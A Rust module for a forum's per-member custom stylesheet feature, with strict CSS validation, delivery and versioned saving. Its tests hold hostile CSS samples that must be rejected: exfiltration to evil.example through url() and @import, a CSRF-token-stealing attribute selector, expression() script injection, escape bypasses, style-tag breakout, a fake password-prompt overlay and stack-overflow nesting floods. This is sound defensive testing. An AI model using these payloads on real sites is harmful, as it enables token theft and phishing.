//! Member custom styles (the `custom_css` and `custom_css_version` columns of `gonof_home_reading_preference`).
//!
//! - **Only applies when the member browses themselves**: the stylesheet URL only appears on the member's
//!   own pages; others, visitors included, never get it when viewing the member's profile. Edit pages, the admin
//!   area, account security, sign-in and two-factor authentication, sensitive pages and error pages do not apply
//!   it, so a member who breaks it can always see the original and change it back.
//! - **Strict validation on save, rejecting the whole thing**; the database stores the submitted text:
//!   limit 16 KiB; any construct that can issue a request is rejected (`url()`, `image-set()`, `@import`,
//!   `@font-face`, every @ rule other than `@media`, site URLs too); disguise protection: no
//!   `position: fixed`, `content` can only be `none`, `normal` or an empty string, `z-index` only `auto` or -1 to
//!   20 (the page header is 30); backslash escapes are always rejected (against bypasses like `u\72l(`); functions
//!   in values go through an allowlist; `--custom-properties` and `!important` are allowed; brackets and
//!   functions nest at most 16 levels deep inside one `@media` condition, selector or value.
//! - **Delivery**: a same-site external stylesheet `/my/style.css?u={uid}&v={version}`, already allowed by
//!   the CSP's `style-src 'self'`, so the CSP does not change; the stylesheet is not inlined into the HTML, so
//!   there is no `</style>` truncation.
//!
//! The current CSP's `img-src 'self' data:` and `default-src 'self'` block off-site images and fonts; that is
//! only a second line of defense.
use std::borrow::Cow;

use crate::{
    content::writes::ContentWriteError,
    db::{self, Database},
    identity::Actor,
    interaction,
};

/// Byte limit of a custom style (UTF-8).
pub const MAX_BYTES: usize = 16 * 1024;
/// Rule count limit; rules inside `@media` count too.
const MAX_RULES: usize = 1000;
#[cfg(test)]
const MAX_NESTING: usize = crate::css_check::MAX_NESTING;

/// Why it does not comply, and where. `line` starts at 1; `None` for problems not tied to a position (too long).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Rejection {
    pub line: Option<u32>,
    pub reason: Cow<'static, str>,
}

impl std::fmt::Display for Rejection {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self.line {
            Some(line) => f.write_str(
                &crate::i18n::current().settings_css_line(line.to_string(), &*self.reason),
            ),
            None => f.write_str(&self.reason),
        }
    }
}

/// Validate a custom style with the shared checker's member profile ([`crate::css_check`]): the first problem is
/// the reason. An empty string (only whitespace) also complies and is treated as "no style" on save.
pub fn validate(css: &str) -> Result<(), Rejection> {
    match crate::css_check::check(css, crate::css_check::Profile::Member, MAX_BYTES, MAX_RULES)
        .into_iter()
        .next()
    {
        None => Ok(()),
        Some(finding) => Err(Rejection {
            line: finding.line,
            reason: finding.problem.text(crate::i18n::current()).into(),
        }),
    }
}

/// The stylesheet as served at `/my/style.css`: the stored text inside the `member` cascade layer, which comes after
/// the core and the skin and loses to the guards (docs/skins.md, "Cascade layers"). The text passed the checker when
/// it was saved; it is the only thing in its file, so a block it left open closes at the end of the file as before.
pub fn served(css: &str) -> String {
    if css.trim().is_empty() {
        return String::new();
    }
    format!("@layer member {{\n{css}\n}}\n")
}

/// The custom style in the database: text and version. `(None, 0)` when there is no preference row.
#[derive(Debug, Default, Clone, PartialEq, Eq)]
pub struct Stored {
    pub css: Option<String>,
    pub version: i64,
}

const SELECT: &str =
    "SELECT custom_css,custom_css_version FROM gonof_home_reading_preference WHERE uid=?";

fn decode(row: Option<db::DbRow>) -> anyhow::Result<Stored> {
    let Some(row) = row else {
        return Ok(Stored::default());
    };
    Ok(Stored {
        css: row.try_get::<Option<String>, _>("custom_css")?,
        version: row.try_get("custom_css_version")?,
    })
}

/// The member's own custom style. The session was already verified in the middleware; this only reads one row by
/// primary key.
pub async fn load(db: &Database, uid: i64) -> anyhow::Result<Stored> {
    decode(
        crate::db::query(SELECT)
            .bind(uid)
            .fetch_optional(db.executor())
            .await?,
    )
}

/// Save or reset (`css` is `None` or only whitespace). Rechecks the credentials and compares the version under the
/// member row lock; the version only grows, and it is also the `v` in the stylesheet URL, so saving again after a
/// reset never hits an old copy cached in the browser. Returns the new version.
pub async fn save(
    db: &Database,
    cache: &crate::cache::Cache,
    actor: Actor,
    css: Option<&str>,
    version: i64,
) -> Result<i64, ContentWriteError> {
    let css = css.filter(|css| !css.trim().is_empty());
    if let Some(css) = css
        && validate(css).is_err()
    {
        return Err(ContentWriteError::Validation(
            crate::i18n::current().settings_error_style_invalid(),
        ));
    }
    if version < 0 {
        return Err(ContentWriteError::Validation(
            crate::i18n::current().settings_error_style_version(),
        ));
    }
    let mut tx = db.begin_write().await?;
    interaction::lock_actor(db, &mut tx, actor, false).await?;
    let current = decode(
        crate::db::query(SELECT)
            .bind(actor.uid)
            .fetch_optional(db.observe(&mut *tx))
            .await?,
    )?;
    if current.version != version {
        return Err(ContentWriteError::Conflict(
            crate::i18n::current().settings_error_style_conflict(),
        ));
    }
    if current.css.as_deref() == css {
        tx.commit().await?;
        crate::cache::member::invalidate(cache, actor.uid).await?;
        return Ok(current.version);
    }
    let next = version.checked_add(1).ok_or(ContentWriteError::Validation(
        crate::i18n::current().settings_error_style_version_range(),
    ))?;
    let now = crate::identity::now();
    crate::db::query("INSERT INTO gonof_home_reading_preference(uid,custom_css,custom_css_version,updated_at) VALUES(?,?,?,?) ON DUPLICATE KEY UPDATE custom_css=VALUES(custom_css),custom_css_version=VALUES(custom_css_version),updated_at=VALUES(updated_at)")
        .bind(actor.uid)
        .bind(css)
        .bind(next)
        .bind(now)
        .execute(db.observe(&mut *tx))
        .await?;
    // The log only records the version and byte count, never the style text.
    crate::db::query("INSERT INTO gonof_common_log(uid,operationuid,type,data,source,dateline) VALUES(?,?,'identity.custom_css',?,'web',?)")
        .bind(actor.uid)
        .bind(actor.uid)
        .bind(serde_json::json!({"version": next, "bytes": css.map_or(0, str::len)}).to_string())
        .bind(now)
        .execute(db.observe(&mut *tx))
        .await?;
    tx.commit().await?;
    crate::cache::member::invalidate(cache, actor.uid).await?;
    Ok(next)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn rejected(css: &str) -> String {
        validate(css).expect_err(css).to_string()
    }

    #[test]
    fn ordinary_styles_pass() {
        for css in [
            "",
            // A comment in Chinese: "\u{6211}\u{7684}\u{6837}\u{5f0f}" means "my style".
            "/* \u{6211}\u{7684}\u{6837}\u{5f0f} */\n.rows--topics .row-title { color: #8b5cf6; font-weight: 600 !important; }",
            ":root { --brand: oklch(55% 0.2 300); --r-sm: 0; }",
            ".avatar, .avatar--initials { border-radius: 50%; }",
            "@media (max-width: 760px) and (prefers-color-scheme: dark) { body { background: linear-gradient(90deg, rgb(0 0 0 / 50%), transparent); } }",
            ".floor-card:not(.is-op):nth-child(2n+1) > .row-body { margin: calc(1rem + 2px) 0; }",
            "a[href^=\"/space/\"] { text-decoration: underline; }",
            ".layout__aside { position: sticky; top: 0; z-index: 2; }",
            ".quote::before { content: \"\"; }",
            ".x { transform: translate(-50%, 0) rotate(3deg); transition: opacity .2s cubic-bezier(.2,0,0,1); }",
        ] {
            assert_eq!(validate(css), Ok(()), "{css}");
        }
    }

    #[test]
    fn external_resources_are_rejected() {
        for css in [
            "body { background: url(https://evil.example/a.png); }",
            "body { background: url(\"/static/img/x.png\"); }",
            "body { background-image: image-set(\"a.png\" 1x); }",
            "body { background: -webkit-image-set(\"a.png\" 1x); }",
            "@import url(https://evil.example/x.css);",
            "@import \"x.css\";",
            "@font-face { font-family: x; src: local(x); }",
            "@namespace svg \"http://www.w3.org/2000/svg\";",
            "@keyframes spin { to { transform: rotate(1turn); } }",
            "input[name=_csrf][value^=a] { background: url(//evil.example/a); }",
            "body { cursor: url(x.cur), auto; }",
            "body { --x: url(a); }",
        ] {
            let reason = rejected(css);
            assert!(
                reason.contains("url()") || reason.contains('@') || reason.contains("not allowed"),
                "{css} -> {reason}"
            );
        }
    }

    #[test]
    fn script_and_obfuscation_are_rejected() {
        assert!(rejected("body { width: expression(alert(1)); }").contains("expression()"));
        assert!(rejected("body { behavior: url(x.htc); }").contains("behavior"));
        assert!(rejected("body { -moz-binding: url(x.xml#a); }").contains("-moz-binding"));
        assert_eq!(
            rejected("a {\n  background: u\\72l(x);\n}"),
            "Line 2: Backslash escapes are not allowed"
        );
        assert!(rejected("a { color: red } </style><script>").contains("Line 1: "));
        assert!(
            rejected("a { color: red; .b { color: blue } }")
                .contains("nested rules are not supported")
        );
        assert!(rejected("a { color: red !imp }").contains("important"));
        assert!(rejected("a { color: env(safe-area-inset-top) }").contains("env()"));
        assert!(rejected("a\u{0} { color: red }").contains("Control characters are not allowed"));
    }

    #[test]
    fn disguise_is_rejected() {
        // The classic overlay: fixed + inset:0 + a high z-index covering the whole page.
        assert!(
            rejected("body::after { position: fixed; inset: 0; z-index: 9999; }")
                .contains("position: fixed")
        );
        assert!(rejected(".a { position: var(--p); }").contains("position"));
        assert!(rejected(".a { z-index: 9999; }").contains("z-index"));
        assert!(rejected(".a { z-index: 21; }").contains("z-index"));
        assert!(rejected(".a { z-index: var(--z); }").contains("z-index"));
        assert!(
            rejected("h1::before { content: \"System notice: enter your password\"; }")
                .contains("content")
        );
        assert!(validate("h1::before { content: attr(title); }").is_err());
        assert!(rejected(".a { content: var(--text); }").contains("content"));
        assert_eq!(validate(".a { z-index: -1; position: relative; }"), Ok(()));
    }

    #[test]
    fn size_and_rule_limits_hold() {
        let big = format!(".a{{color:red}}{}", " ".repeat(MAX_BYTES));
        assert_eq!(rejected(&big), "A personal style can be at most 16 KiB");
        let many = ".a{color:red}".repeat(MAX_RULES + 1);
        assert!(many.len() <= MAX_BYTES);
        assert!(rejected(&many).contains("At most 1,000 rules"));
        assert!(rejected("@media screen { @media print { a { color: red } } }").contains("@media"));
        assert!(rejected("@media (min-width: calc(1px)) { a { color: red } }").contains("@media"));
    }

    const TOO_DEEP: &str = "Brackets and functions can be nested at most 16 levels deep";

    #[test]
    fn nesting_stops_at_the_limit() {
        let styles = |depth: usize| {
            let close = ")".repeat(depth);
            [
                format!(
                    "@media {}min-width: 1px{close} {{ a {{ color: red }} }}",
                    "(".repeat(depth)
                ),
                format!("a{}.b{close} {{ color: red }}", ":is(".repeat(depth)),
                format!("a {{ width: {}1px{close}; }}", "calc(".repeat(depth)),
                format!("a {{ width: calc({}1px{close}; }}", "(".repeat(depth - 1)),
            ]
        };
        for css in styles(MAX_NESTING) {
            assert_eq!(validate(&css), Ok(()), "{css}");
        }
        for css in styles(MAX_NESTING + 1) {
            assert_eq!(rejected(&css), format!("Line 1: {TOO_DEEP}"), "{css}");
        }
        // The line is the one with the first bracket past the limit.
        let css = format!(
            "a {{\n  width: {}1px{};\n}}",
            "(\n".repeat(20),
            ")".repeat(20)
        );
        assert_eq!(
            rejected(&css),
            format!("Line {}: {TOO_DEEP}", MAX_NESTING + 2)
        );
    }

    /// A whole style of opening brackets is refused at the limit rather than recursed into level by level, which
    /// would overflow the stack and abort the process.
    #[test]
    fn deep_nesting_floods_are_rejected_without_recursing() {
        let room = MAX_BYTES - 32;
        for css in [
            format!("a {{ width: {}", "(".repeat(room)),
            format!("a {{ width: {}", "calc(".repeat(room / 5)),
            format!("a {{ width: {}", "var(".repeat(room / 4)),
            format!("a{} {{ color: red }}", ":not(".repeat(room / 5)),
            format!("a {} {{ color: red }}", "is(".repeat(room / 3)),
            format!("@media {}", "(".repeat(room)),
            format!(
                "@media screen {{ a {{ width: {}{} }} }}",
                "(".repeat(room / 2),
                ")".repeat(room / 2)
            ),
        ] {
            assert!(css.len() <= MAX_BYTES);
            assert_eq!(
                rejected(&css),
                format!("Line 1: {TOO_DEEP}"),
                "{}",
                &css[..40]
            );
        }
    }
}
